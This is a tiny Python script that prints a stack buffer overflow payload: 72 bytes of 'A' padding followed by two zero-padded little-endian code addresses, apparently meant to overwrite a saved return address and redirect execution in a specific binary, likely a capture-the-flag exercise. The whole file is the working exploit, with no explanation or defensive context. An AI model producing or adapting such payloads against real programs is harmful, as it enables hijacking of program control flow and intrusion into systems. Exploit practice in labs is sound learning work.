import sys
x = "\x41"*72 + "\x50\x18\x40" + "\x00"*5 + "\xfd\x18\x40" + "\x00"*5
sys.stdout.buffer.write(x.encode('latin-1'))